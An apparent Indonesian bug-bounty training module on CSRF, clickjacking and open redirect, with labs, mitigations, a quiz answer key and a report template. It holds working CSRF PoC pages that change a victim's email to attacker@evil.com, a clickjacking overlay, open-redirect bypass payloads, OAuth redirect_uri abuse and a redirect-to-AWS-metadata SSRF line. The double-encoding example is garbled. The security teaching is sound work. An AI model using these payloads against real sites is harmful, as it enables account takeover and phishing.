# CSRF, Clickjacking & Open Redirect

## Fokus Materi

Memahami dan mengeksploitasi CSRF, clickjacking, dan open redirect vulnerabilities. Ketiga bug ini sering dianggap "low severity" tanpa chaining, tapi researcher yang kreatif bisa meningkatkan impactnya secara signifikan dengan menggabungkan ketiga vulnerability ini atau dengan vulnerability lain.

## Deskripsi Materi

CSRF (Cross-Site Request Forgery) mengeksploitasi browser's automatic cookie sending behavior. Ketika user logged in ke target.com, browser automatically sends session cookie untuk setiap request ke domain tersebut, bahkan jika request originates dari evil.com. Attacker bisa membuat page yang force victim's browser untuk send request ke target.com dengan victim's session cookie — melakukan action tanpa victim's knowledge.

Clickjacking (UI redressing) mengeksploitasi ability untuk overlay trusted site dengan invisible layer. Victim mengklik button yang mereka lihat (legitimate site), tapi sebenarnya mereka mengklik hidden element yang melakukan different action di trusted site.

Open redirect terjadi ketika aplikasi menerima user-controlled input untuk redirect destination dan tidak memvalidasi dengan benar. Attacker bisa abuse trust faktor dari legitimate domain untuk redirect victim ke malicious site — untuk phishing, credential harvesting, atau chaining dengan vulnerability lain.

Ketiga vulnerability ini tampak sederhana sendirian, tapi sangat powerful sebagai enabler:
- CSRF bisa elevate impact dari limited XSS menjadi full account takeover
- Open redirect bisa bypass domain whitelist di CSP atau OAuth redirect_uri validation
- Clickjacking bisa chained dengan CSRF untuk trigger action tanpa victim knowing

## Topik Pembahasan

• CSRF mechanism: bagaimana browser automatically sends cookie ke cross-site request
• CSRF requirement: no token / token not validated / Referer not checked
• CSRF token bypass: token not bound to session, token predictable, token in URL (GET)
• SameSite cookie edge cases: Lax vs Strict vs None — bypass scenarios
• PoC HTML CSRF: form auto-submit, fetch-based, img src-based
• Clickjacking basics: iframe overlay, X-Frame-Options missing, click/deceptive overlay
• Clickjacking to CSRF chain: use clickjacking untuk bypass CSRF protection
• Open redirect types: parameter-based (?next=, ?url=, ?return=), header-based, meta refresh, DOM-based
• Open redirect bypass: URL encoding, double encoding, null byte, subdomain bypass (evil.target.com)
• Open redirect in OAuth: abuse redirect_uri untuk steal authorization code
• Open redirect chaining: redirect → phishing, redirect → SSRF, redirect → CSP bypass
• Parameter fuzzing untuk open redirect: wordlist redirect param (next, url, redirect, return, goto)
• Severity assessment: kapan open redirect/CSRF valid sebagai bounty

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi CSRF vulnerability dan bypass protection mechanisms
2. Create convincing CSRF PoC untuk laporan
3. Identifikasi clickjacking vulnerability dan chaining opportunities
4. Identifikasi open redirect dan berbagai bypass techniques
5. Chain open redirect dengan vulnerability lain untuk increased impact
6. Assess severity secara akurat untuk ketiga vulnerability type

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Program besar (disclosed via Hacktivity)
- Jenis vulnerability: CSRF leading to account takeover
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan bahwa change email functionality tidak memiliki CSRF protection. Attacker membuat page dengan auto-submitting form yang change victim's email ke attacker-controlled email, then trigger password reset to that email, then takeover account fully.
- Root cause: Server tidak implement CSRF token untuk email change endpoint. Tidak ada anti-CSRF mechanism di place.
- Impact: Full account takeover via CSRF → email change → password reset. Severity: High (CVSS 8.2)
- Pelajaran untuk bug hunter: Always test state-changing functionality (email change, password change, profile update) untuk CSRF.

---

- Platform: Intigriti
- Program/Target: Program publik
- Jenis vulnerability: Open redirect di OAuth flow → authorization code theft
- Link report: Researcher blog post (disclosed)
- Ringkasan kasus: OAuth provider memiliki redirect_uri validation yang lemah. Attacker bisa register evil.com subdomain sebagai redirect_uri. Victim mengklik authorization link dengan malicious redirect_uri → redirected ke evil subdomain yang attacker control → authorization code captured → exchanged untuk access token → full account takeover pada OAuth provider.
- Root cause: OAuth provider validate redirect_uri dengan prefix match, bukan exact match. Attacker bisa use subdomain.
- Impact: OAuth account takeover. Severity: High.
- Pelajaran untuk bug hunter: Test OAuth redirect_uri validation — sering vulnerable.

## Analisis Teknis

### CSRF Attack Mechanics

**Why CSRF works:**

```
User logged in to target.com
Browser automatically sends session cookie with every request to target.com

Attacker page at evil.com:
<html><body>
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
</body></html>

When victim visits evil.com:
1. Browser loads attacker page
2. Auto-submit form to target.com
3. Browser includes target.com cookie automatically
4. Server processes request with victim's authenticated session
```

**CSRF Token Bypass Scenarios:**

**Scenario 1: Token not bound to session**
```http
# User A gets token: abc123
POST /change-email
CSRF-Token: abc123
Cookie: session=usera_session

# Attacker obtains token (maybe visible in page source or known value)
# Attacker use token from any session, not necessarily victim's
POST /change-email
CSRF-Token: abc123 (token from different session)
Cookie: session=attacker_session
# Server might accept because token format is valid
```

**Scenario 2: Token predictable**
```http
# Token is just counter: token=1, token=2, token=3
# Attacker can generate next expected token
POST /change-email
CSRF-Token: 4 (next expected)
```

**Scenario 3: GET endpoint with token in URL**
```http
# Token exposed in URL — leak via Referer, browser history, logs
GET /change-email?email=attacker@evil.com&csrf_token=abc123
# Attacker knows token via Referer from another page they control
```

**Scenario 4: SameSite=None without additional protection**
```http
# If SameSite=None and no token, but site uses HTTPS
# Non-same-site request still sends cookie
# Need additional protection: token, or SameSite=Lax/Strict
```

### CSRF PoC HTML Templates

**Template 1: Auto-submit form (standard)**
```html
<html>
<body>
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf_token" value="hunter123" />
  <input type="submit" value="Submit" />
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>
```

**Template 2: Fetch-based (no form)**
```html
<html>
<body>
<script>
fetch("https://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({"email": "attacker@evil.com"})
});
</script>
</body>
</html>
```

**Template 3: Single-pixel image (GET-based)**
```html
<img src="https://target.com/api/action?param=value" width="1" height="1">
```

### Clickjacking Attack Mechanics

**Basic clickjacking setup:**
```html
<style>
iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  opacity: 0;
  z-index: 10;
}
button {
  position: absolute;
  top: 50%;
  left: 50%;
  z-index: 5;
}
</style>

<iframe src="https://target.com/settings"></iframe>
<button onclick="malicious_action()">Click to win prize</button>
```

**Clickjacking → CSRF chain:**
- Use clickjacking untuk overlay a button that triggers CSRF form
- Victim sees button they think is on legitimate site
- In reality, clicking triggers hidden CSRF form
- Bypass CSRF protection that relies on user interaction

### Open Redirect Bypass Techniques

**Basic open redirect:**
```http
GET /redirect?url=https://evil.com

# Server: "Location: https://evil.com"
# Browser redirects to evil.com
```

**Bypass 1: Double encoding**
```http
GET /redirect?url=%25%6f%67%2e%63%6f%6d
# Decoded: %oog.com → og.com (if decoder runs twice)
# If server decodes once: %oog.com → og.com
```

**Bypass 2: Subdomain confusion**
```http
GET /redirect?url=https://target.com.evil.com

# If server only checks if starts with "https://target.com"
# evil.com subdomain might pass (depends on validation logic)
```

**Bypass 3: Null byte**
```http
GET /redirect?url=https://evil.com%00.target.com

# Null byte might terminate domain check in some parsers
# Target.com%00 → treated as target.com
```

**Bypass 4: Path confusion**
```http
GET /redirect?url=https://target.com/../../@evil.com

# If server doesn't normalize path
# Could navigate away from target.com context
```

**Bypass 5: Protocol confusion**
```http
GET /redirect?url=//evil.com

# If server prepends https://
# Results in https://evil.com
# Relative protocol: //evil.com resolves to current protocol
```

**Bypass 6: URL fragment**
```http
GET /redirect?url=https://target.com#@evil.com

# Fragment part might be used in redirect
# Depends on server's URL parsing logic
```

### Open Redirect → Impact Chains

**Chain 1: OAuth redirect_uri bypass**
```http
# OAuth authorization request
GET /oauth/authorize?
  client_id=attacker_app
  &redirect_uri=https://attacker.com/callback
  &state=xyz

# If redirect_uri validation weak (prefix match instead of exact)
# Attacker register subdomain: target.com.attacker.com
# redirect_uri=https://target.com.attacker.com/callback
# Passes prefix check, but redirects to attacker.com
```

**Chain 2: Open redirect → CSP bypass**
```html
<!-- If CSP allows target.com -->
<!-- But target.com has open redirect to evil.com -->
<!-- CSP: script-src 'self' https://target.com -->

<!-- Page at target.com with open redirect -->
<!-- Page can redirect to evil.com/payload.js -->

<!-- evil.com/payload.js script loaded as if from target.com -->
<!-- CSP allows because target.com is whitelisted -->
```

**Chain 3: Open redirect → phishing**
```http
# Real link to trusted site
https://target.com/login?redirect=https://target.com/redirect?url=https://evil.com/phishing

# Victim sees target.com in URL → trusts it
# Actually redirected to phishing page
```

**Chain 4: Open redirect → SSRF**
```http
# If server follows redirect in SSRF-vulnerable code
POST /fetch-url
{"url": "https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"}

# Server-side follows redirect → hits AWS metadata → data exfil
```

## Praktik Lab Legal

### Lab 1: CSRF Discovery & PoC Development

- **Nama lab:** CSRF Exploitation
- **Tujuan:** Find CSRF vulnerabilities dan develop convincing PoC
- **Environment:** Burp Suite, browser, target lab dengan state-changing functionality
- **Langkah praktik:**

  1. Identify all state-changing endpoints: profile update, password change, email change, settings
  2. Check apakah each endpoint has CSRF token
  3. Create PoC HTML untuk each CSRF-vulnerable endpoint
  4. Test PoC: open in browser, verify action executes
  5. For endpoints with CSRF: test bypass (token in URL, predictable token, token not bound to session)
  6. Test CSRF in API endpoints (JSON body) — form-based PoC won't work

- **Expected result:** Peserta menemukan minimal 3 CSRF vulnerabilities dan membuat working PoC untuk masing-masing
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 2: Clickjacking to CSRF Chain

- **Nama lab:** Clickjacking CSRF Chain
- **Tujuan:** Demonstrate clickjacking sebagai bypass untuk CSRF protection
- **Environment:** Burp Suite, browser, target dengan X-Frame-Options missing
- **Langkah praktik:**

  1. Verify target allows iframe embedding (no X-Frame-Options or CSP frame-ancestors)
  2. Identify CSRF-protected action that requires user click
  3. Create overlay page: iframe target action + visible button
  4. Test: victim clicks button → hidden action executes
  5. Document the chain: clickjacking → CSRF bypass → action execution

- **Expected result:** Peserta memahami dan bisa demonstrate clickjacking CSRF bypass
- **Catatan keamanan:** Lab ini untuk educational purpose.

### Lab 3: Open Redirect & OAuth Redirect Abuse

- **Nama lab:** Open Redirect Exploitation
- **Tujuan:** Find open redirect dan demonstrate chained impact
- **Environment:** Burp Suite, browser, target lab
- **Langkah praktik:**

  1. Identify redirect parameters: next, url, redirect, return, goto, dest, destination
  2. Test basic payloads: relative URL, absolute URL with different domain
  3. Test bypass techniques: encoding, double encoding, subdomain manipulation
  4. Test open redirect in OAuth flow (if OAuth integration exists)
  5. Chain: open redirect → phishing page (demonstrate credential harvesting)
  6. Document bypass techniques yang berhasil

- **Expected result:** Peserta menemukan open redirect dengan working bypass dan demonstrate impact
- **Catatan keamanan:** Lab ini hanya untuk authorized environment. Jangan buat actual phishing page yang benar-benar collect credentials.

## Tools

- **CSRF PoC:** Custom HTML, Burp Suite (Generate CSRF PoC)
- **Clickjacking:** Custom HTML overlay
- **Open redirect:** Burp Suite, ffuf (for parameter fuzzing), custom bypass payloads
- **Parameter wordlists:** SecLists/Injection vectors untuk redirect params

## Checklist Bug Hunter

- [ ] Identify all state-changing endpoints (POST/PUT/DELETE)
- [ ] Check CSRF protection: token existence, validation, binding
- [ ] Test CSRF bypass scenarios: token in URL, predictable token, token not bound to session
- [ ] Test same-site cookie bypass: None cookie bisa digunakan untuk CSRF
- [ ] Create HTML PoC untuk each CSRF vulnerability
- [ ] Verify X-Frame-Options / CSP frame-ancestors untuk clickjacking
- [ ] Identify all redirect parameters
- [ ] Test open redirect bypass: encoding, subdomain, path manipulation
- [ ] Test open redirect in OAuth redirect_uri
- [ ] Chain vulnerabilities untuk increased impact

## Common Mistakes

1. **Only test CSRF for forms, skip API endpoints** — API endpoints accepting JSON body might not have CSRF protection, berbeda dari form-based endpoint.

2. **Report CSRF without demonstrating impact** — CSRF untuk "change theme" sounds low severity. CSRF untuk "change email → password reset → ATO" sounds high. Always demonstrate full impact chain.

3. **Abaikan open redirect karena "low severity"** — Open redirect yang bisa bypass OAuth redirect_uri validation atau CSP whitelist bisa punya high impact when chained.

4. **Not testing SameSite=None edge cases** — Researcher test CSRF pada cookies dengan default SameSite, tidak test edge cases untuk SameSite=None with cross-origin.

5. **Skip clickjacking testing** — Researcher fokus di data-theft vulnerabilities, miss UI redressing attacks yang bisa trigger state-changing actions.

## Mitigasi Developer

**CSRF Prevention:**
- Implement Synchronizer Token Pattern (CSRF token per session, per request)
- Use SameSite=Lax or SameSite=Strict for session cookies
- Double-submit cookie pattern as alternative (less secure but no server state)
- Validate Origin/Referer header
- Custom request header (e.g., X-Requested-With) — AJAX-only, not cross-origin form submit

**Clickjacking Prevention:**
- Set X-Frame-Options: DENY or SAMEORIGIN
- Implement Content-Security-Policy: frame-ancestors 'none' or 'self'
- Use X-Frame-Options with CSP frame-ancestors for modern browsers

**Open Redirect Prevention:**
- Don't use user input for redirect destination without validation
- Use allowlist validation for redirect URLs
- If redirect is needed, use relative URL or known redirect patterns
- Validate scheme: only allow http/https, reject javascript:
- Don't trust domain part after subdomain is whitelisted

## Mini Quiz

1. CSRF attack bekerja karena:
   a) Server tidak memvalidasi email address
   b) Browser automatically sends session cookie untuk cross-site requests
   c) User mengklik link yang malicious
   d) Server tidak punya rate limiting

2. CSRF token yang tidak di-bind ke session bisa di-bypass karena:
   a) Attacker bisa guess token value
   b) Attacker bisa gunakan token dari session lain
   c) Token tidak di-validate
   d) Semua jawaban benar

3. SameSite=Strict cookie mencegah:
   a) XSS attack
   b) CSRF attack (cookie tidak dikirim untuk cross-site request)
   c) Clickjacking
   d) Open redirect

4. Open redirect bypass dengan double encoding bekerja karena:
   a) Server tidak sanitize input
   b) Server decode input multiple times — first decode reveal encoded path, second decode reveal redirect target
   c) Browser automatically decode URL
   d) Tidak ada bypass technique yang work

5. Open redirect di OAuth flow bisa lead ke:
   a) Phishing page yang di-host di trusted domain
   b) Authorization code theft → account takeover
   c) Session hijacking
   d) Semua jawaban benar

**Kunci Jawaban:** 1-B, 2-D, 3-B, 4-B, 5-D

## Assignment

1. **CSRF Hunt:** Identifikasi semua state-changing endpoint di target lab. Check CSRF protection di each. Buat PoC HTML untuk each vulnerable endpoint. Document bypass attempts.

2. **Open Redirect Collection:** Find semua redirect parameters di target lab. Test bypass techniques untuk each. Document bypass technique dan context yang vulnerable.

3. **CSRF Impact Chain:** Untuk CSRF vulnerability yang ditemukan, demonstrate full impact chain: dari simple state change → privilege escalation → account takeover. Buat video PoC.

4. **OAuth Redirect Test:** Jika target menggunakan OAuth, test redirect_uri validation dengan berbagai bypass techniques.

## Template Report Bug Bounty

```markdown
# Bug Report: CSRF Leading to Account Takeover via Email Change

## Summary
Change email functionality tidak memiliki CSRF protection. Attacker bisa
change victim's email address tanpa consent, lalu gunakan password reset
untuk full account takeover.

## Platform / Program
HackerOne | [Program Name]

## Severity
High | CVSS 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Vulnerability Type
CSRF / Cross-Site Request Forgery

## Asset / Endpoint
POST https://target.com/settings/email

## Description
Endpoint untuk change email address tidak memvalidasi CSRF token.
Attacker bisa membuat page yang when visited by logged-in victim,
automatically POST to change-email endpoint dengan attacker's email.
Victim tidak perlu klik anything — auto-submit form.

After email changed, attacker bisa:
1. Request password reset for new email
2. Receive reset link via their email
3. Reset password → full account takeover

## Steps to Reproduce
1. Attacker creates malicious page (CSRF PoC):
```html
<html><body>
<form action="https://target.com/settings/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

2. Victim (logged in to target.com) visits attacker's page
3. Form auto-submits, victim's browser sends:
   POST /settings/email
   Cookie: [victim_session_cookie]
   email=attacker@evil.com
4. Server processes request, email changed to attacker@evil.com
5. Attacker requests password reset → email sent to attacker@evil.com
6. Attacker clicks reset link → password changed
7. Attacker logs in with new password → full account takeover

## Impact
- Full account takeover without victim's knowledge
- Victim lose access to their account
- Attacker bisa access all victim data, payment info, orders
- Could lead to further attacks depending on account privileges

## Evidence
[Screenshot: HTML CSRF PoC]
[Screenshot: Request captured in Burp showing auto-submit]
[Screenshot: Email changed confirmation]
[Screenshot: Password reset received at attacker email]
[Screenshot: Account takeover complete]

## Remediation / Recommendation
1. Implement CSRF token untuk all state-changing operations
2. Use SameSite=Lax or Strict cookie attribute
3. Validate Origin/Referer header
4. After email change, invalidate all active sessions except current
5. Send notification to old email when email is changed
```